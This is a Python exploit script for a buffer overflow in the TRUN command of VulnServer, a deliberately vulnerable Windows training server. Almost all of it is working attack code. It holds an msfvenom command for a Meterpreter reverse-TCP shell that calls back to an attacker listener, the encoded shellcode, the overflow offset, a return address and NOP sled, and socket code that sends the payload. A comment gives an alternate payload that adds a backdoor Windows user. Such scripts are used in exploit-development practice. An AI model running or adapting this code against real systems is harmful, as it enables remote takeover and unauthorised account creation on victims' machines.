#This is a Python script for exploiting VulnServer's buffer overflow vulnerability.
#VulnServer is a networked C application running on Windows.
#This is an exploit for it.
#You can do whatever you want with this, but use it responsibly please.
#Author ~ Mitchell Skinner

import socket
import sys

ip = sys.argv[1]
port = int(sys.argv[2])

#This is our reverse shell that comes from the following command:
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=8421 -f python -b \x00 -e x86/shikata_ga_nai

buf =  ""
buf += "\xbb\x6c\x18\x62\x60\xdb\xd4\xd9\x74\x24\xf4\x5f\x2b"
buf += "\xc9\xb1\x4b\x83\xef\xfc\x31\x5f\x11\x03\x5f\x11\xe2"
buf += "\x99\xe4\x8a\xe2\x61\x15\x4b\x83\xe8\xf0\x7a\x83\x8e"
buf += "\x71\x2c\x33\xc5\xd4\xc1\xb8\x8b\xcc\x52\xcc\x03\xe2"
buf += "\xd3\x7b\x75\xcd\xe4\xd0\x45\x4c\x67\x2b\x99\xae\x56"
buf += "\xe4\xec\xaf\x9f\x19\x1c\xfd\x48\x55\xb2\x12\xfc\x23"
buf += "\x0e\x98\x4e\xa5\x16\x7d\x06\xc4\x37\xd0\x1c\x9f\x97"
buf += "\xd2\xf1\xab\x9e\xcc\x16\x91\x69\x66\xec\x6d\x68\xae"
buf += "\x3c\x8d\xc6\x8f\xf0\x7c\x17\xd7\x37\x9f\x62\x21\x44"
buf += "\x22\x74\xf6\x36\xf8\xf1\xed\x91\x8b\xa1\xc9\x20\x5f"
buf += "\x37\x99\x2f\x14\x3c\xc5\x33\xab\x91\x7d\x4f\x20\x14"
buf += "\x52\xd9\x72\x32\x76\x81\x21\x5b\x2f\x6f\x87\x64\x2f"
buf += "\xd0\x78\xc0\x3b\xfd\x6d\x79\x66\x6a\x41\xb3\x99\x6a"
buf += "\xcd\xc4\xea\x58\x52\x7e\x65\xd1\x1b\x58\x72\x16\x36"
buf += "\x1c\xec\xe9\xb9\x5c\x24\x2e\xed\x0c\x5e\x87\x8e\xc7"
buf += "\x9e\x28\x5b\x47\xcf\x86\x34\x27\xbf\x66\xe5\xcf\xd5"
buf += "\x68\xda\xef\xd5\xa2\x73\x85\x2c\x25\xbc\xf1\x2f\x35"
buf += "\x54\x03\x30\x15\x40\x8a\xd6\x3f\x9a\xda\x41\xa8\x03"
buf += "\x47\x19\x49\xcb\x52\x67\x49\x47\x56\x97\x04\xa0\x13"
buf += "\x8b\x71\x8f\xdb\x53\x82\x9a\xdb\x39\x86\x0c\x8c\xd5"
buf += "\x84\x69\xfa\x79\x76\x5c\x79\x7d\x88\x21\x94\xf5\xbf"
buf += "\xb7\x26\x62\xc0\x57\xa6\x72\x96\x3d\xa6\x1a\x4e\x66"
buf += "\xf5\x3f\x91\xb3\x6a\xec\x04\x3c\xda\x40\x8e\x54\xe0"
buf += "\xbf\xf8\xfa\x1b\xea\x7a\xfc\xe3\x6b\xbe\xfc\x20\xba"
buf += "\x86\x8a\x4f\x7e\xbd\x85\x3a\x23\x94\x0f\x44\x77\xe6"
buf += "\x05"

#if you want to just create a net user with the name "Winner"  and the password "password1"
#msfvenom -p windows/exec cmd="net user Winner password1 /add" -f python -b \x00 -e x86/shikata_ga_nai

#well, here's our exploit.
try:	
	#set up the socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
	s.connect((ip, port))
	print s.recv(1024)

	#get yourself to that EIP >:]
	garbage = "A" * 2006
	ret = "\xaf\x11\x50\x62"
	
	#set up a nop to do nothing and create a setup for a payload
	nop = "\x90" * 24
	
	#formatting Remote Code Execution at the pointer
	badstr = "TRUN ." + garbage + ret + nop + buf + "\r\n"

	#Send the code
	s.send(badstr)
	s.recv(1024)
	s.close

except:
	print "***************"
	print "*****CRASH*****"
	print "***************"
